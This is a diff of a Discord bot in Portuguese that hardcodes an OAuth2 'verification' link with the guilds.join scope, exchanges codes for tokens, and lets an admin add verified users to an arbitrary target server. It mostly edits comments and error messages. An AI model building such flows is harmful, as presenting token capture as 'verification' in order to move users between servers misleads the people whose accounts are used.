@@ -8,9 +8,9 @@ const {
 } = require('discord.js');
 
 // --- CONFIGURAÇÕES ---
-// Onde os avisos de "Novo Usuário" chegam
+// ID do canal de logs (onde chega o aviso para o admin)
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
-// Para onde o usuário é enviado após se verificar no site
+// Link para onde o usuário volta após o sucesso (O canal do servidor)
 const REDIRECT_TARGET = 'https://discordapp.com/channels/1430240815229305033'; 
 
 const app = express();
@@ -26,6 +26,7 @@ app.get('/callback', async (req, res) => {
 
     try {
         // 1. Troca Código por Token
+        // IMPORTANTE: As variáveis no Render devem bater com o ID do link que você mandou
         const tokenResponse = await axios.post(
             'https://discord.com/api/oauth2/token',
             new URLSearchParams({
@@ -117,7 +118,7 @@ app.get('/callback', async (req, res) => {
 
     } catch (error) {
         console.error(error);
-        res.send('❌ Erro na verificação.');
+        res.send('❌ Erro na verificação. Verifique se o CLIENT_SECRET no Render corresponde ao BOT do link.');
     }
 });
 
@@ -145,7 +146,8 @@ client.on('interactionCreate', async interaction => {
     if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
         if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
 
-        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join`;
+        // --- AQUI ESTÁ O LINK QUE VOCÊ PEDIU ---
+        const authUrl = "https://discord.com/oauth2/authorize?client_id=1443717513748812011&response_type=code&redirect_uri=https%3A%2F%2Fhunter-bot-verify.onrender.com%2Fcallback&scope=identify+guilds.join";
 
         const embed = new EmbedBuilder()
             .setTitle('🔓 Liberação de Acesso')
@@ -188,7 +190,7 @@ client.on('interactionCreate', async interaction => {
             );
             await interaction.editReply(`✅ **Sucesso!** Enviado para \`${targetServerId}\`.`);
         } catch (erro) {
-            await interaction.editReply('❌ Falha ao adicionar. Verifique se o Bot está no servidor alvo.');
+            await interaction.editReply('❌ Falha ao adicionar. O Bot está no servidor alvo com permissão de Criar Convite/Admin?');
         }
     }
 });
